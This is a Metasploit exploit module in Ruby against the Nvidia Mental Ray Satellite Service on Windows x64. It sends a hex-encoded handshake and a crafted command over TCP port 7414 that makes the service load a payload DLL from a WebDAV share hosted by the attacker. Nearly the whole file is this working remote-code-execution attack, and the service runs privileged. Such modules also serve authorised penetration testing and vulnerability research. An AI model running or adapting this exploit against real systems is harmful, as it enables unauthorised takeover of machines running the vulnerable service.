##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/http/webdav'
require 'socket'
#load '/root/git/metasploit-framework/lib/msf/core/exploit/http/webdav.rb'

class Metasploit3 < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::TcpServer
  include Msf::Exploit::Remote::WebDAVServer
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'Nvidia Mental Ray Satellite Service Arbitrary DLL Load',
      'Description'	=> %q{
          Tested on Win7 x64 with http://images.autodesk.com/adsk/files/Maya_mrsat3.11.1_Win_64bit.exe
      },
      'License'		=> MSF_LICENSE,
      'Author'		=>
        [
          'Luigi Auriemma', # Discovery
          'Donato Ferrante', # Discovery
          'Ben Campbell <eat_meatballs[at]hotmail.co.uk' # Metasploit Module
        ],
      'References'	=>
        [
          [ 'URL', 'http://revuln.com/files/ReVuln_NVIDIA_mental_ray.pdf' ]
        ],
      'Platform'	=> 'win',
      'Targets'		 =>
        [
          [ 'Windows x64',
            {
              'Arch'   	=>	ARCH_X86_64
            }
          ],
        ],
      'Privileged'	 => true,
      'DisclosureDate' => 'Dec 10 2013',
      'DefaultTarget'	 => 0))

    register_options([
                         Opt::RPORT(7414)
                     ])

  end

  def payload_data
    generate_payload_dll
  end

  def payload_name
    @payload_name
  end

  def exploit
    print_status("Please be patient as we have to wait for SMB timeouts before WebDAV is used.")
    super
  end

  def primer
    # No idea what most of this hello is...
    hello = "6c72696d3030303030203030303031203136333932203037353134203030303031203039303936203030303030207261796d7"
    hello << "36734302d332e31312e312e345f5f5f5f5f5f5f5f5f5f5f5f0020007c5241593331317c53554231000100000000e90300000"
    hello << "0000000ffffffffffffffff1807000000000000dc10d7fdfe0700003018a40500000000e73654fffe070000c0afcd0000000"
    hello << "000ffffffffffffffffffffffffffffffff18070000000000007014a70100000000763754fffe0700000000000000000000f"
    hello << "035ae01000000003036ae0100000000da2152fffe0700003036ae0100000000a33754fffe070000000000000000000000000"
    hello << "00000000000ffffffffffffffffffffffffffffffff3036ae0100000000c40e53fffe0700007014a70100000000180700000"
    hello << "0000000000000000000000000000000000000000000000000000000020000000000000001000000000000005035440400000"
    hello << "0008013a7010000000090b3cd00000000001807000000000000b929d80300000000000000000000000018070000000000009"
    hello << "0b3cd000000000010cda701000000000000000000000000010100000000000000b3cd0000000000060000000000000066000"
    hello << "200000000000000020000000a0008000000a01a0fe73d00cf118ca300804034ae01000000000100000000000000000000000"
    hello << "0000000030000000a000000"

    hello = Rex::Text.hex_to_raw(hello)
    @share_name = rand_text_alpha(8)
    @payload_name = rand_text_alpha(8) + ".dll"
    path = "#{webdav_path}#{@share_name}\\#{@payload_name}"

    # Start of command - again no idea
    load_dll =  Rex::Text.hex_to_raw("4ed32cb1740500000000000001130013")
    # Length of path string including null byte
    load_dll << [path.length+1].pack('V')
    # Data type? Not sure
    load_dll << [2].pack('V')
    # Assembly Load? Not sure
    load_dll << "AL"
    load_dll << path << "\x00"
    # Some padding at the end... Could be randomized perhaps?
    load_dll << "\x00" * (1386 - path.length)

    # We have to start a second listening port so we just use Ruby Sockets for this at the moment...
    # modules/exploits/winndows/browser/adobe_flash_rtmp maybe have a better way of doing this
    # although we dont actually care about handling client connections it appears as long as the
    # service can make a connection its happy and will move onto the DLL loading
    port = 7514
    vprint_status("Started listening on #{port}")
    server = TCPServer.open(port)

    vprint_status("Connecting to target and sending commands")
    connect
    sock.put(hello)
    sock.put(load_dll)
    print_status("Command sent, please be patient for WebDAV connection...")
    sleep(2000)
    disconnect
  end
end

